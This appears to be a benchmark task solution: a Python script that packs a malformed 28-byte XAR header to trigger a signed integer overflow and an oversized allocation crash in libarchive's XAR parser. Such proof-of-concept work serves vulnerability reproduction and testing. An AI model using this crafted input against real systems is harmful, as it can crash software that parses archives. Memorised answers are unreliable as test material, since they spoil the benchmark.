import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a signed integer overflow in libarchive's XAR format
        parser. The offset to the archive's data heap is calculated as the sum
        of the header size (`uint16_t`) and the compressed Table of Contents (TOC)
        length (`uint64_t`). This sum is stored in an `int64_t`.

        By providing large values for both `header.size` and `toc_len_compressed`,
        their sum can exceed the maximum value for a signed 64-bit integer
        (2^63 - 1), causing it to wrap around and become negative.

        This PoC constructs a minimal 28-byte XAR header with values chosen
        to trigger this overflow. The subsequent attempt by libarchive to
        `malloc` a huge region of memory (equal to `toc_len_compressed`) is
        what leads to the crash, which is detected by sanitizers as a
        heap-related error.

        Args:
            src_path: Path to the vulnerable source code tarball.

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # All fields in a XAR header are big-endian.
        # struct xar_header {
        #     uint32_t magic;
        #     uint16_t size;
        #     uint16_t version;
        #     uint64_t toc_len_compressed;
        #     uint64_t toc_len_uncompressed;
        #     uint32_t checksum_alg;
        # };
        
        magic = 0x78617221  # 'xar!'
        size = 0xFFFF
        version = 1
        
        # Set toc_len_compressed to a large value such that
        # size + toc_len_compressed > 2^63 - 1.
        # 0xFFFF + 0x7FFFFFFFFFFFFFFF = 0x800000000000FFFE, which is negative
        # when interpreted as a signed 64-bit integer.
        toc_len_compressed = 0x7FFFFFFFFFFFFFFF
        
        toc_len_uncompressed = 0
        checksum_alg = 0

        # Pack the header fields into a bytes object according to the struct format.
        # The format string specifies big-endian byte order (>) and the
        # integer types for each field.
        poc = struct.pack(
            '>IHHQQI',
            magic,
            size,
            version,
            toc_len_compressed,
            toc_len_uncompressed,
            checksum_alg
        )
        
        return poc
